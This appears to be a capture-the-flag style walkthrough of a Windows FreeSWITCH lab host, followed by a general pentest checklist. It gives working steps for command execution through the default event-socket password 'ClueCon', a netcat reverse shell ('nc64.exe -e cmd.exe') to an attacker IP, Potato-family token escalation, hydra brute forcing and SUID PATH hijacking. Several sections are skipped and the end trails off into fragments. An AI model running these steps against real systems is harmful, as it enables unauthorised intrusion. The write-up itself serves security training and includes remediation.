Thirteen ports, one product

A Windows host that firewalls almost everything, but leaves an entire telephony platform answering on thirteen ports. The useful discovery is not a port number — it is a version.

Reading it: the box is a FreeSWITCH PBX, and it names its own build twice:

  • 8021/tcp → FreeSWITCH mod_event_socket

  • rdp-ntlm-info leaks Target_Name: OSCP, Product_Version: 10.0.19041 → Windows 10 21H2 class.

mod_event_socket on 8021 is the interesting one. It is FreeSWITCH's control interface: a line-based text protocol that, once authenticated, lets a client run internal API commands — including api system <command>. That is a documented feature, and it is exactly what makes this box exploitable when the default password is left in place.

The version matters more than the port list: FreeSWITCH 1.10.1 is the release that ships with the well-known default event-socket password ClueCon, and mod_event_socket is designed to run API commands. One product, one version, one exposed control interface.

→ 02 — The event socket

02

The event socket

Default password on a control interface

Port 8021 is not a vulnerability by accident. mod_event_socket is FreeSWITCH's management interface, and it is supposed to run commands. The vulnerability is that it still accepts the password that shipped in the default configuration.

2.1 The handshake

On Kali

command
{ printf 'auth ClueCon\n\n'; sleep 2; printf 'api system whoami\n\n'; sleep 2; } | timeout 10 nc 192.168.137.151 8021
output
Content-Type: auth/request

Content-Type: command/reply
Reply-Text: +OK accepted

Content-Type: api/response
Content-Length: 11

oscp\chris

Reading it: four lines of protocol explain the whole box.

  • On connect the server volunteers Content-Type: auth/request — it wants a password before anything else. There is no banner advertising a version, so this tells nmap nothing and a human everything.
  • auth ClueCon → +OK accepted. ClueCon is the built-in default password in conf/autoload_configs/event_socket.conf.xml. It has not been changed.
  • api system <cmd> is an ESL API command, executed with the privileges of the FreeSWITCH service. system shells out through cmd.exe /c and returns stdout.

The identity that answers is OSCP\chris — a normal local user (the host is in WORKGROUP, so this is a machine account, not a domain one). The PBX runs as that unprivileged user rather than as LocalSystem, which is why the shell is only the first half of the box.

2.2 Authenticate with the default password

Two properties of the default configuration make this reachable from off-host:

Setting Default Effect here
password ClueCon known value, unchanged
listen-ip :: (all interfaces) reaches the network, not just loopback
apply-inbound-acl (commented out) no source-IP restriction

FreeSWITCH's own documentation warns that ESL is a privileged interface and should be ACL-bound and password-protected. Neither control is in place.

2.3 Run a command

Every command in the rest of this walkthrough is sent through one small Python client, which is the public exploit for this version (freeswitch-exploit.py, author 1F98D) trimmed to a single call. Its whole working part is four steps:

output
s.send(bytes('auth {}\n\n'.format('ClueCon'), 'utf8'))
s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
response = s.recv(8096).decode()
print(response)

Nothing is exploited in the memory-corruption sense. The client authenticates to an administrative service with its default password and asks it to run a command. That is why the box falls over in one step and why the fix is a configuration change, not a patch.

2.4 What -ERR no reply means

The first attempts on this box were spent misreading the protocol, so it is worth writing down.

On Kali

command
python3 1.py 192.168.137.151 "pwd"
python3 1.py 192.168.137.151 "cd \scripts"
output
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply

-ERR no reply is not an error report. ESL returns it whenever the api command produced no stdout. Three different causes all produce the same four words:

Command Why stdout was empty
pwd not a cmd.exe builtin — pwd is a PowerShell alias, so cmd /c pwd fails and the error goes to stderr, which is not captured
cd \scripts succeeds, prints nothing, and the working directory dies with the process
pscore6 not a command at all — it was a word copied out of the PowerShell banner

The consequence for the whole engagement: exit status and stderr are invisible. A command can fail completely and look identical to one that succeeded quietly. Every test from here on is written to produce observable stdout, and every redirect uses 2>&1.

The positive control is a command that does write to stdout:

On Kali

command
python3 1.py 192.168.137.151 "powershell"
output
Authenticated
Content-Type: api/response
Content-Length: 172

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Program Files\FreeSWITCH>

Two useful facts from the prompt: PowerShell is available, and the service working directory is C:\Program Files\FreeSWITCH — the install directory, which is not writable by chris. Every staged file therefore has to go to a temp path, and every reference to it must be absolute, because the working directory does not survive between calls.

2.5 The exploit wrapper

tools/1.py (in this directory) is that client. Every command block in this walkthrough reads:

command
python3 1.py <target> "<command>"

with the target 192.168.137.151. Because the command is sent as a single line terminated by a blank line, two characters need care:

  • & and | are interpreted by the outer shell on the FreeSWITCH side, so chaining works but splits unpredictably inside nested quotes. Single commands are safer.
  • %VAR% is expanded by the cmd.exe that FreeSWITCH spawns before any child process runs, so %USERNAME% reports chris, not the identity of a process a privilege-escalation tool later creates. This bites in chapter 05.

Foothold

Command execution as chris

3.1 Who am I

On Kali

command
python3 1.py 192.168.137.151 "whoami"
output
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris

The Content-Length: 11 is worth noticing: oscp\chris is 10 bytes, so the extra byte is the trailing newline and the response is exactly the command output. When a later command returns Content-Length: 14, the body is -ERR no reply and nothing was captured (chapter 02).

3.2 The stateless problem

Every api system call spawns a fresh cmd.exe under the FreeSWITCH service and reaps it afterwards. Nothing survives: not the working directory, not environment changes, not background processes started in the foreground.

On Kali

command
python3 1.py 192.168.137.151 "cd \scripts"
python3 1.py 192.168.137.151 "cmd /c cd /d C:\Windows\Temp & cd"
output
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply

The first call succeeds and prints nothing, so it is indistinguishable from a failure — and the directory change is gone by the next call either way.

The second call is the interesting one. & looks like cmd.exe chaining, but over ESL each segment runs in its own process, so the cd never carries to the second command:

output
Authenticated
Content-Type: api/response
Content-Length: 28

C:\Program Files\FreeSWITCH

That is the service directory, printed by a cd that started fresh. Twenty-eight bytes, not the C:\Windows\Temp a single cmd /c would have produced.

Design rule for the rest of the box: one command per call, absolute paths always, and make the command print something so the response is not -ERR no reply.

3.3 Egress test

Before building any reverse shell, confirm the target can reach the attacker. This is cheaper than debugging a payload twice.

On Kali — a listener in one terminal:

command
nc -lvnp 4451

On Kali — the test through ESL, in another:

command
python3 1.py 192.168.137.151 "powershell -nop -c \"(New-Object Net.Sockets.TcpClient).Connect('192.168.45.158',4451);'ok'\""
output
Authenticated
Content-Type: api/response
Content-Length: 3

ok

and the listener logs the connection:

output
listening on [any] 4451 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51407

The connection closes immediately — that is the test working, not failing: the script creates a socket, prints ok, and exits, which disposes the client. A payload that reads from the socket in a loop is what stays alive.

The same test with a full PowerShell shell payload is what proves the shell works. It was delivered this way and the connection stayed established for as long as the loop was reading:

output
ESTAB  0  0  192.168.45.158:4446  192.168.137.151:51317  users:(("nc",pid=128422,fd=4))

Three facts from that transcript:

  • whoami answers oscp\chris here. It is worth stating explicitly because the same command produced no output at all in the SYSTEM shell of chapter 05 — the anomaly is specific to that context, not a general property of this box.

4.3 File access, and what it rules out

The user flag sits on chris's own desktop and is readable:

9d05eefc0447258ceab32e91e3b54aac

The administrator's desktop is a different story:

On Kali

command
python3 1.py 192.168.137.151 "type C:\Users\Administrator\Desktop\proof.txt 2>&1"
output
Authenticated
Content-Type: api/response
Content-Length: 18

Access is denied.

Reading it: Access is denied is a real answer, and a useful one. It proves:

  • the file exists at that path (a wrong path returns The system cannot find the file specified),
  • and chris cannot read it, so nothing in a standard-user context will ever retrieve it.

That is the negative control for chapter 05. If a later "escalation" had read this file, the ACL would have had to be wrong; instead the escalation has to change who is asking.

There is no proof.txt on chris's own desktop — the only file there is local.txt. Any zero-byte or missing result on this box has to be explained, not assumed: dir /b on an empty directory also returns File Not Found, which is indistinguishable from a bad path if only stdout is captured.

5.1 Why this is a Potato box

The token from chapter 04 has three properties that, together, are the whole attack:

Property Value Why it matters
Integrity High the token is not filtered, so a stolen SYSTEM token can create a process
Privilege SeImpersonatePrivilege enabled the account may impersonate a token handed to it
Group BUILTIN\Users no administrative path — the privilege is the only way up

SeImpersonatePrivilege lets a process take on an impersonation token produced by a local RPC/COM call. The Potato family abuses that in a straight line:

  1. Ask a privileged service — RPCSS over DCOM, or a named-pipe listener — for an authentication handshake.
  2. The service authenticates as NT AUTHORITY\SYSTEM, which hands the client a SYSTEM impersonation token.
  3. Impersonate it, then create a process. Because the token is high-integrity, the process is SYSTEM.

Two variants apply here, and both succeed on this host:

  • GodPotato-NET4 — no CLSID dependency; works on current builds.
  • JuicyPotatoNG — a CLSID-scanning rewrite of the 2016 tool, which reports authresult success {854A20FB-2D44-457D-992F-EF13785D2B51} and CreateProcessAsUser OK.

The original JuicyPotato depends on one specific CLSID that Microsoft has since disabled, which is why the NG rewrite scans for a live one instead. Both working variants are already staged in chris's temp directory, so the choice between them is convenience, not necessity. GodPotato is used below because its -cmd argument takes a whole command line, which keeps the copy in 5.2 to a single step.

5.5 What did not work, and why

Every attempt below reported CurrentUser: NT AUTHORITY\SYSTEM and Find System Token : True. None of them produced a shell. The token was obtained each time — the child process was the problem.

The causes below are the ones consistent with each log. Only the working variant was verified end to end; the failures were verified only by their absence of a connection.

Attempt Result Cause (likely)
GodPotato -cmd "powershell -nop -w h -ep bypass -f ...\rev4446.ps1" log shows SYSTEM + pid, no connection the PowerShell arguments do not survive GodPotato's process creation; the child starts and exits
GodPotato -cmd "...\run4446.bat" log shows SYSTEM + pid, no connection CreateProcess cannot execute a .bat — it needs cmd.exe. A batch file is data, not an image
GodPotato -cmd "cmd /c ...\run4446.bat" Content-Length: 940, empty body, no connection the nested cmd /c string was split before GodPotato saw it
GodPotato -cmd "...\nc64.exe -e powershell.exe <ip> 4447" connects, no prompt nc -e takes one program name and no arguments; powershell.exe starts without -nop/-ep and prints nothing, so the session looks dead

The run that worked is the simplest possible child: nc64.exe -e cmd.exe, an .exe starting an .exe, with the arguments as plain positional values.

The payload was never at fault. The same rev4446.ps1 connects immediately when launched directly as chris — the connection was confirmed established:

6.3 What "root" means on Windows

There is no root account on this box. The equivalent is NT AUTHORITY\SYSTEM, and it was reached through a token, not a password — so nothing about the escalation survives a reboot, and no credential was obtained that would work on another host.

Worth stating explicitly for the report: the box was not owned by cracking a password, exploiting a memory-corruption bug, or finding a local administrator in a group. It was owned by a default password on an administrative interface, then by a privilege the service account already held.

7.3 Remediation for the host owner

Issue Fix
ESL reachable from the network with the default password set a strong password in conf/autoload_configs/event_socket.conf.xml
No source restriction on 8021 uncomment and set apply-inbound-acl, or bind listen-ip to 127.0.0.1
The PBX service account holds SeImpersonatePrivilege remove the privilege from OSCP\chris; a PBX service has no legitimate need for it
The PBX runs as a normal user account run it as a dedicated low-privilege service account with no interactive logon
Full offensive toolset present in a user profile remove it; its presence shortened the escalation to a single command

The first two are the ones that matter. Even with a strong password, a service account holding SeImpersonatePrivilege on an unpatched-ACL host is a SYSTEM shell waiting for a local invocation — but it would have required code execution first, which is exactly what the default password handed over for free.

7.4 Lessons

Read the protocol before reading the exploit. Two hours of this box were spent on -ERR no reply — a string that means "no stdout", not "failed". Every failed payload in chapter 05 was diagnosed correctly only after the wrapper's output semantics were understood. When a management interface answers in a fixed vocabulary, learn the vocabulary first.

A successful exploit log is not a successful exploit. GodPotato printed CurrentUser: NT AUTHORITY\SYSTEM and Find System Token : True on four attempts that produced nothing. The token was obtained every time; the child process was the failure. Log lines describe what the tool did, not what the operator got.

Choose the simplest child process. nc64.exe -e cmd.exe worked on the first try after a PowerShell script, a batch file and a nested cmd /c all failed. .exe launching .exe with positional arguments has the fewest moving parts, and it is the one form CreateProcessAsUser reliably executes.

%VAR% describes the wrong process. %USERNAME% was expanded by the outer cmd.exe before the escalation ran, so a SYSTEM-written file reported USERNAME=chris. Identity claims have to come from the elevated process itself, or from an access control decision it can make and chris cannot — the HKLM\SECURITY read in chapter 05 is a better proof than any whoami.

Verify with output, not with silence. del, cd and dir /b on an empty directory all produce no stdout or File Not Found, and over a stdout-only interface those are indistinguishable from a typo. Every verification step in this walkthrough names a file, prints a value, or redirects 2>&1.

Escalation by privilege is quieter than escalation by exploit. No CVE was used on this box. The foothold was a default password, and the escalation was a privilege the account already held — SeImpersonatePrivilege on a high-integrity service token. Both are configuration decisions, and neither appears in a patch list.

08

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

D=$(mktemp -d /tmp/x.XXXXXX)

#!/bin/bash

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.
